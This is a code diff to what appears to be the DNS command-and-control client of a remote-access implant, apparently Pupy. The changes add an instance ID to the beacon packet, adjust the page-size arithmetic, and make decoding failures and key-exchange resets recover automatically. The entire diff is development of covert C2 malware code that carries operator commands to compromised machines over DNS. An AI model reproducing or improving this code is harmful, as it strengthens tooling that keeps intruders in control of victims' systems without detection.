@@ -51,6 +51,8 @@ class DnsCommandsClient(Thread):
             self.pupy = None
             self.cid = 31337
 
+        self.iid = os.getpid() % 65535
+
         if ns and dnslib:
             if not type(ns) in (list, tuple):
                 ns = ns.split(':')
@@ -182,22 +184,15 @@ class DnsCommandsClient(Thread):
         length, = struct.unpack_from('B', data)
         payload = data[1:1+length]
 
-        decoded = None
-
-        try:
-            decoded = self.encoder.decode(payload, nonce, symmetric)
-        except Exception as e:
-            logging.exception(e)
-            raise DnsCommandClientDecodingError
-
-        return decoded
+        return self.encoder.decode(payload, nonce, symmetric)
 
     def _q_page_encoder(self, data):
         data_append = ''
         ldata = len(data)
 
         if ldata > 35:
-            if CLIENT_VERSION > 1 and (ldata - 35 + 4 + 1 + 8 + 6 < 35):
+            # 35 -- limit, 4 - nonce, 1 - version, 8 - CID, 2 - IID, 6 - NODE
+            if CLIENT_VERSION > 1 and (ldata - 35 + 4 + 1 + 8 + 2 + 6 < 35):
                 data, data_append = data[:35], data[35:]
             else:
                 raise ValueError('Too big page size ({})'.format(ldata))
@@ -206,7 +201,9 @@ class DnsCommandsClient(Thread):
         node_block = ''
 
         if CLIENT_VERSION > 1:
-            node_block = data_append + struct.pack('>BQ', CLIENT_VERSION, self.cid)
+            node_block = data_append + struct.pack(
+                '>BQH', CLIENT_VERSION, self.cid, self.iid)
+
             node_block += to_bytes(self.node, 6)
 
         payload = self.encoder.encode(data + node_block, nonce, symmetric=True)
@@ -259,36 +256,46 @@ class DnsCommandsClient(Thread):
             return []
 
         response = None
-        failed = False
 
         for attempt in xrange(2):
             try:
                 payload = self._a_page_decoder(addresses, nonce)
+
+                if not payload:
+                    logging.error('DNSCNC: No data: {} -> {}'.format(addresses, payload))
+                    self.spi = None
+                    self.encoder.kex_reset()
+                    self.on_session_lost()
+                    continue
+
                 response = Parcel.unpack(payload, nonce, check_csum)
-                failed = False
+
+                if attempt > 0:
+                    logging.info('DNSCNC: Recovered ({}) with PSK/PK'.format(attempt))
+
                 break
 
-            except ParcelInvalidCrc:
+            except (ParcelInvalidCrc, DnsCommandClientDecodingError):
                 logging.error('CRC FAILED / Attempt {}'.format(attempt))
 
                 self.spi = None
                 self.encoder.kex_reset()
                 self.on_session_lost()
-                failed = True
 
-            except ParcelInvalidPayload:
+            except ParcelInvalidPayload, e:
                 logging.error(
-                    'CRC FAILED / Invalid payload / {}/{}'.format(self.failed, 5))
+                    'CRC FAILED / Invalid payload ({}) / {}/{}'.format(
+                        e, self.failed, 5))
 
-        if failed:
-            self.failed += 1
+        if response:
+            return list(response.commands)
 
-            if self.failed > 5:
-                self.next()
+        self.failed += 1
 
-            return []
+        if self.failed > 5:
+            self.next()
 
-        return list(response.commands)
+        return []
 
     def on_pastelink(self, url, action, encoder):
         if not tinyhttp:
